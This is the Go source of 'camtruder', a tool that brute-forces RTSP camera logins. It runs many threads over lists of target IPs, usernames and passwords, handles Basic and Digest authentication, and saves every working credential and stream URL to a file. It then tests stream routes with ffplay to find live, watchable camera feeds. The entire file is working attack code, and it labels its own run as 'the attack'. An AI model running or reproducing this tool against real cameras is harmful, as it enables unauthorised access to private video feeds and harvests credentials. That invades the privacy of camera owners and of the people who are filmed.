package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/common-nighthawk/go-figure"
	"github.com/icholy/digest"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/gologger/levels"
)

type RTSPInfo struct {
	authenticated         bool
	auth                  string
	port                  string
	username              string
	password              string
	supportsRoutes        bool
	supportsRoutesChecked bool
}

var (
	authenticatedIPs       = make(map[string]*RTSPInfo)
	connectionErrorCount   = make(map[string]int)
	skippingMessagePrinted = make(map[string]bool)
	alreadyPrinted         = make(map[string]bool)
	routeThreads           = 3
	maxRetries             int
	port                   string = "554"
	outputFilePath         string
	outputRouteFilePath    string
	outputRouteFile        *os.File
	outputFile             *os.File
	threads                int
	verbose                int
	timeout                int
	mu                     sync.Mutex
)

/*
There's nothing to see here, just some bad, spaghetti and probably unstable code, but it works like a charm.

I know a lot of people is not happy with all-in-one file code.
But don't forget, this tool is not meant to be here publicly when it's first created.
It was a personal tool.

I'm not eager at organizing my projects, if you do it for me, don't hesitate to let me know.
If you have any suggestions, please feel free to open an issue on GitHub.

TODO: Add exploits
*/
func main() {
	BannerCamtruder()
	help := flag.Bool("h", false, "Show help")
	flag.StringVar(&port, "port", "554", "Specify the RTSP port to scan")
	targetFile := flag.String("t", "", "Path to a file containing target IPs or a single IP address")
	usernameFile := flag.String("u", "", "Path to a file containing usernames or a single username")
	passwordFile := flag.String("p", "", "Path to a file containing passwords or a single password")
	routesFile := flag.String("r", "", "Path to a file containing RTSP routes or a single RTSP route")
	flag.StringVar(&outputFilePath, "o", "", "Path to an output file where credential results will be saved")
	flag.StringVar(&outputRouteFilePath, "or", "", "Path to an output file where route results will be saved")
	flag.IntVar(&threads, "c", 200, "Number of concurrent threads to use during the attack")
	flag.IntVar(&routeThreads, "ct", 3, "Number of concurrent threads to use during the route detection")
	flag.IntVar(&verbose, "v", 0, "Set verbosity level: 1 for warnings, 2 for errors, 3 for debugging")
	flag.IntVar(&timeout, "to", 3, "Connection timeout duration in seconds")
	flag.IntVar(&maxRetries, "tr", 3, "Maximum number of retries for each connection")

	flag.Parse()

	if *help {
		flag.Usage()
		return
	}

	CheckFlags(targetFile, usernameFile, passwordFile, routesFile)

	// Start the attack

	gologger.Info().Label("CAMTRUDER").Msg("Starting the attack...")
	RTSPAttack([]byte(*targetFile), usernameFile, passwordFile)
	if *routesFile != "" {
		gologger.Info().Label("CAMTRUDER").Msg("Starting Route Detection...")
		RTSPRouteDetection(routesFile)
	}
	defer outputFile.Close()
	defer outputRouteFile.Close()

	gologger.Info().Label("CAMTRUDER").Msg("Done!")
}

func BannerCamtruder() {
	banner := figure.NewFigure(" camtruder", "cybermedium", true)
	banner.Print()
	println("  by: @alw1ez \t\t\t\t v1.0")
	println()
}

func CheckFlags(targetFile *string, usernameFile *string, passwordFile *string, routesFile *string) {
	// Check if target is piped from stdin
	if *targetFile == "" {
		stdinStat, _ := os.Stdin.Stat()
		if (stdinStat.Mode() & os.ModeCharDevice) == 0 {
			ipBytes, err := io.ReadAll(os.Stdin)
			if err != nil {
				gologger.Error().Msgf("Failed to read from stdin: %s", err)
				return
			}
			*targetFile = strings.TrimSpace(string(ipBytes))
		}
	} else {
		// Or not see if it's a file, if not then use it as ip
		if _, err := os.Stat(*targetFile); os.IsNotExist(err) {
			*targetFile = strings.TrimSpace(*targetFile)
		} else {
			ipBytes, err := os.ReadFile(*targetFile)
			if err != nil {
				gologger.Error().Msgf("Failed to read IP file: %s", err)
				return
			}
			*targetFile = strings.TrimSpace(string(ipBytes))
		}
	}

	if *targetFile == "" {
		flag.Usage()
		os.Exit(1)
	}

	// Check if output file is specified
	var err error
	if outputFilePath != "" {
		outputFile, err = os.Create(outputFilePath)
		if err != nil {
			gologger.Error().Msgf("Failed to create output file: %s", err)
			return
		}
	}

	// Check if output route file is specified
	if outputRouteFilePath != "" {
		outputRouteFile, err = os.Create(outputRouteFilePath)
		if err != nil {
			gologger.Error().Msgf("Failed to create output route file: %s", err)
			return
		}
	}

	// Check if passwordFile is a file or not, if not then use it as password
	if _, err := os.Stat(*passwordFile); os.IsNotExist(err) {
		*passwordFile = strings.TrimSpace(*passwordFile)
	} else {
		passwordBytes, err := os.ReadFile(*passwordFile)
		if err != nil {
			gologger.Error().Msgf("Failed to read password file: %s", err)
			return
		}
		*passwordFile = strings.TrimSpace(string(passwordBytes))
	}

	// Check if usernameFile is a file or not, if not then use it as username
	if _, err := os.Stat(*usernameFile); os.IsNotExist(err) {
		*usernameFile = strings.TrimSpace(*usernameFile)
	} else {
		usernameBytes, err := os.ReadFile(*usernameFile)
		if err != nil {
			gologger.Error().Msgf("Failed to read username file: %s", err)
			return
		}
		*usernameFile = strings.TrimSpace(string(usernameBytes))
	}

	// Check if routesFile is a file or not, if not then use it as routes
	if _, err := os.Stat(*routesFile); os.IsNotExist(err) {
		*routesFile = strings.TrimSpace(*routesFile)
	} else {
		routesBytes, err := os.ReadFile(*routesFile)
		if err != nil {
			gologger.Error().Msgf("Failed to read routes file: %s", err)
			return
		}
		*routesFile = strings.TrimSpace(string(routesBytes))
	}
}

func RTSPRouteDetection(routesFile *string) {
	var wg sync.WaitGroup
	var sema = make(chan struct{}, routeThreads)

	for ip, rtspInfo := range authenticatedIPs {
		for _, route := range strings.Split(string(*routesFile), "\n") {
			wg.Add(1)
			sema <- struct{}{}
			go func(ip string, ipRtsp *RTSPInfo, route string) {
				defer func() {
					<-sema
					wg.Done()
				}()
				RTSPRouteRequest(ip, ipRtsp, route)
			}(ip, rtspInfo, route)
		}
	}
	wg.Wait()
}

func RTSPRouteRequest(ip string, ipRtsp *RTSPInfo, route string) {
	if !ipRtsp.supportsRoutes {
		return
	}

	var url string

	url = fmt.Sprintf("rtsp://%s:%s@%s:%s/%s", ipRtsp.username, ipRtsp.password, ip, ipRtsp.port, "camtruder_0n")
	if ipRtsp.username == "" || ipRtsp.password == "" {
		url = fmt.Sprintf("rtsp://%s:%s/%s", ip, ipRtsp.port, "camtruder_0n")
	}

	if !ipRtsp.supportsRoutesChecked {
		ipRtsp.supportsRoutesChecked = true
		if isWatchable(url) {
			ipRtsp.supportsRoutes = false
			if ipRtsp.username == "" || ipRtsp.password == "" {
				gologger.Info().Msgf("Stream rtsp://%s:%s is accessible, but doesn't support routes.\n", ip, ipRtsp.port)
				if outputRouteFile != nil {
					fmt.Fprintf(outputRouteFile, "rtsp://%s:%s\n", ip, ipRtsp.port)
				}
				return
			}
			gologger.Info().Msgf("Stream rtsp://%s:%s@%s:%s is accessible, but doesn't support routes.\n", ipRtsp.username, ipRtsp.password, ip, ipRtsp.port)
			if outputRouteFile != nil {
				fmt.Fprintf(outputRouteFile, "rtsp://%s:%s@%s:%s\n", ipRtsp.username, ipRtsp.password, ip, ipRtsp.port)
			}
			return
		}
	}

	url = fmt.Sprintf("rtsp://%s:%s@%s:%s/%s", ipRtsp.username, ipRtsp.password, ip, ipRtsp.port, route)
	if ipRtsp.username == "" || ipRtsp.password == "" {
		url = fmt.Sprintf("rtsp://%s:%s/%s", ip, ipRtsp.port, route)
	}
	if isWatchable(url) {
		gologger.Info().Msgf("Stream %s is accessible.\n", url)
		if outputRouteFile != nil {
			fmt.Fprintf(outputRouteFile, url+"\n")
		}
		return
	}

	if verbose >= 2 {
		gologger.Warning().Msgf("Stream %s is not accessible.\n", url)
	}
}

func RTSPAttack(ipData []byte, usernameFile *string, passwordFile *string) {
	var wg sync.WaitGroup
	var sema = make(chan struct{}, threads)

	// for users, passwords, and ips to brute force
	for _, username := range strings.Split(string(*usernameFile), "\n") {
		for _, password := range strings.Split(string(*passwordFile), "\n") {
			for _, rtsp_ip := range strings.Split(string(ipData), "\n") {
				wg.Add(1)
				sema <- struct{}{}
				// handle multiple ip specific ports.
				var ip string = rtsp_ip
				if strings.Contains(rtsp_ip, ":") {
					port = strings.Split(rtsp_ip, ":")[1]
					ip = strings.Split(rtsp_ip, ":")[0]
				}

				go func(ip string, port string, username string, password string) {
					defer func() {
						<-sema
						wg.Done()
					}()
					RTSPDescribeRequest(ip, port, username, password)
				}(ip, port, username, password)
			}
		}
	}
	wg.Wait()
}

func RTSPDescribeRequest(ip string, port string, username string, password string) {
	if ip == "" {
		return
	}

	// If authenticatedIPs[ip] is not nil, that means got 200 and defined it. Skip.
	mu.Lock()
	if authenticatedIPs[ip] != nil {
		mu.Unlock()
		return
	}
	mu.Unlock()

	// Check if the IP has reached the connection error limit
	mu.Lock()
	if connectionErrorCount[ip] >= maxRetries {
		if verbose >= 2 {
			if !skippingMessagePrinted[ip] {
				gologger.Error().Msgf("Skipping %s:%s due to repeated connection errors", ip, port)
				skippingMessagePrinted[ip] = true
			}
		}
		mu.Unlock()
		return
	}
	mu.Unlock()

	authStr := fmt.Sprintf("%s:%s", username, password)
	auth := base64.StdEncoding.EncodeToString([]byte(authStr))

	gologger.DefaultLogger.SetMaxLevel(levels.LevelDebug)

	// Set up a timeout for the connection
	conn, err := net.DialTimeout("tcp", ip+":"+port, time.Second*time.Duration(timeout))
	if err != nil {
		mu.Lock()
		connectionErrorCount[ip]++
		mu.Unlock()
		if verbose >= 2 {
			gologger.Error().Msgf("Connection error for rtsp://%s:%s: %s\n", ip, port, err)
		}
		return
	}
	defer conn.Close()

	// send the DESCRIBE (auth) request to detect authentication method.
	conn.SetWriteDeadline(time.Now().Add(time.Second * time.Duration(timeout)))
	_, err = fmt.Fprintf(conn, "DESCRIBE rtsp://%s:%s RTSP/1.0\r\nCSeq: 1\r\n\r\n", ip, port)
	if err != nil {
		mu.Lock()
		connectionErrorCount[ip]++
		mu.Unlock()
		if verbose >= 2 {
			gologger.Error().Msgf("Failed to send detect request to rtsp://%s:%s\n", ip, port)
		}
		return
	}

	// DEBUG: DESCRIBE (auth_detection) request sent
	if verbose >= 3 {
		gologger.Debug().Msgf("Sent DESCRIBE1 (auth_detection) request to rtsp://%s:%s\n", ip, port)
	}

	// Read the response
	conn.SetReadDeadline(time.Now().Add(time.Second * time.Duration(timeout)))
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		mu.Lock()
		connectionErrorCount[ip]++
		mu.Unlock()
		if verbose >= 2 {
			gologger.Error().Msgf("Failed to read response from rtsp://%s:%s\n", ip, port)
		}
		return
	}

	// DEBUG: DESCRIBE (auth_detection) response received.
	if verbose >= 3 {
		gologger.Debug().Msgf("Received DESCRIBE (auth_detection) response from rtsp://%s:%s\n%s\n", ip, port, string(buf[:n]))
	}

	// If 200, that means RTSP doesn't require auth, so skip.
	describeAuthResponse := string(buf[:n])
	if strings.Contains(describeAuthResponse, "200 OK") {
		mu.Lock()
		if alreadyPrinted[ip] {
			mu.Unlock()
			return
		}
		alreadyPrinted[ip] = true
		authenticatedIPs[ip] = &RTSPInfo{true, "", port, "", "", true, false}

		gologger.Info().Msgf("Successfully connected to rtsp://%s:%s\n", ip, port)
		if outputFile != nil {
			fmt.Fprintf(outputFile, "rtsp://%s:%s\n", ip, port)
		}
		mu.Unlock()
		return
	}

	// Parse Digest or Basic from response, if both or none, use Basic.
	var authMode string = "Basic"
	if strings.Contains(describeAuthResponse, "WWW-Authenticate: Digest") {
		authMode = "Digest"
		realm, nonce := ParseRTSPResponse(describeAuthResponse)

		chal := &digest.Challenge{
			Realm: realm,
			Nonce: nonce,
		}

		cred, _ := digest.Digest(chal, digest.Options{
			Username: username,
			Password: password,
			Method:   "DESCRIBE",
			URI:      "rtsp://" + ip + ":" + port,
		})

		auth = cred.String()
	}

	// Send the DESCRIBE request
	conn.SetWriteDeadline(time.Now().Add(time.Second * time.Duration(timeout)))
	_, err = fmt.Fprintf(conn, "DESCRIBE rtsp://%s:%s RTSP/1.0\r\nCSeq: 1\r\nAuthorization: %s\r\n\r\n", ip, port, auth)
	if err != nil {
		mu.Lock()
		connectionErrorCount[ip]++
		mu.Unlock()
		if verbose >= 2 {
			gologger.Error().Msgf("Failed to send attack request to rtsp://%s:%s\n", ip, port)
		}
		return
	}

	// DEBUG: DESCRIBE request sent
	if verbose >= 3 {
		gologger.Debug().Msgf("Sent DESCRIBE request to rtsp://%s:%s@%s:%s\n", username, password, ip, port)
	}

	// Read the response
	conn.SetReadDeadline(time.Now().Add(time.Second * time.Duration(timeout)))
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		mu.Lock()
		connectionErrorCount[ip]++
		mu.Unlock()
		if verbose >= 2 {
			gologger.Error().Msgf("Failed to read response from rtsp://%s:%s\n", ip, port)
		}
		return
	}

	// DEBUG: DESCRIBE response received
	if verbose >= 3 {
		gologger.Debug().Msgf("Received DESCRIBE response from rtsp://%s:%s@%s:%s\n%s\n", username, password, ip, port, string(buf[:n]))
	}

	// Check the response
	describeResponse := string(buf[:n])
	if strings.Contains(describeResponse, "200 OK") {
		mu.Lock()
		if alreadyPrinted[ip] {
			mu.Unlock()
			return
		}
		alreadyPrinted[ip] = true
		authenticatedIPs[ip] = &RTSPInfo{true, auth, port, username, password, true, false}

		gologger.Info().Msgf("[%s] Successfully connected to rtsp://%s:%s@%s:%s\n", authMode, username, password, ip, port)
		if outputFile != nil {
			fmt.Fprintf(outputFile, "rtsp://%s:%s@%s:%s\n", username, password, ip, port)
		}
		mu.Unlock()
		return
	} else if strings.Contains(describeResponse, "401") || strings.Contains(describeResponse, "403") {
		if verbose >= 1 {
			gologger.Warning().Msgf("Invalid credentials for rtsp://%s:%s@%s:%s\n", username, password, ip, port)
		}
		if verbose >= 1 && outputFile != nil {
			fmt.Fprintf(outputFile, "%s\n", ip)
		}
		return
	} else if strings.Contains(describeResponse, "404") || strings.Contains(describeResponse, "400") {
		return
	} else {
		mu.Lock()
		connectionErrorCount[ip] = 2
		mu.Unlock()
		if verbose >= 2 {
			gologger.Error().Msgf("Unexpected response from rtsp://%s:%s, resp:\n%s\n", ip, port, describeResponse)
		}
		return
	}
}

func ParseRTSPResponse(response string) (string, string) {
	lines := strings.Split(response, "\n")
	var realm, nonce string

	for _, line := range lines {
		if strings.HasPrefix(line, "WWW-Authenticate: Digest ") {
			authLine := strings.TrimPrefix(line, "WWW-Authenticate: Digest")
			pairs := strings.Split(authLine, ", ")

			for _, pair := range pairs {
				parts := strings.SplitN(pair, "=", 2)
				if len(parts) != 2 {
					continue
				}
				key := strings.TrimSpace(parts[0])
				value := strings.Trim(parts[1], "\"")

				if key == "realm" {
					realm = value
				} else if key == "nonce" {
					nonce = value[:len(value)-2]
				}
			}
			break
		}
	}

	return realm, nonce
}

func isWatchable(rtspURL string) bool {
	// Start ffplay with the given RTSP URL
	cmd := exec.Command("ffplay", "-i", rtspURL, "-t", "3", "-nodisp", "-autoexit")

	// Create a buffer to capture the output
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	// Start the command
	err := cmd.Start()
	if err != nil {
		fmt.Printf("Error starting ffplay: %v\n", err)
		return false
	}

	// Wait for a short period to see if it can play
	time.Sleep(3 * time.Second)

	// Stop the command
	err = cmd.Process.Kill()
	if err != nil {
		fmt.Printf("Error stopping ffplay: %v\n", err)
		return false
	}

	// Check the output for any errors
	output := out.String()
	return !containsError(output)
}

func containsError(output string) bool {
	errorIndicators := []string{
		"Could not open",
		"Connection refused",
		"Server returned",
		"Invalid data",
		"Stream not found",
	}

	for _, indicator := range errorIndicators {
		if bytes.Contains([]byte(output), []byte(indicator)) {
			return true
		}
	}
	return false
}
